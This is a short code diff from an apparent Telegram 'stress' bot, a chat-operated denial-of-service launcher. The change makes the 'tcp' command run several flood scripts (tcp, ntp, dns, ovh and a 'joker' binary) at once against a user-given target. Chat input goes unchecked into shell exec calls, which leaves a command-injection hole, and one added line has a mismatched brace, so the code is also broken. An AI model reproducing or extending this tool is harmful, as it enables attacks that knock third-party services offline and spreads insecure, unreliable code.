@@ -363,7 +363,11 @@ bot.onText(/\/stress (.+) (.+) (.+) (.+)(?: (.+))?/, (msg, match) => {
       exec(`node methods/raw.js http://${target} ${duration}`)
       break;
     case 'tcp':
-      command = `node methods/tcp.js ${target} ${port} ${duration}`
+      exec(`node methods/tcp.js ${target} ${port} ${duration}`)
+      exec(`node methods/ntp.js ${target} ${port} ${duration}`)
+      exec(`node methods/dns.js ${target} ${port} ${duration}`)
+      exec(`node methods/ovh.js ${target} ${port} ${duration}`}
+      exec(`node methods/./joker GET ${target} ${port} ${duration} 8500`)
       break;
     case 'dns':
       command = `node methods/dns.js ${target} ${port} ${duration}`
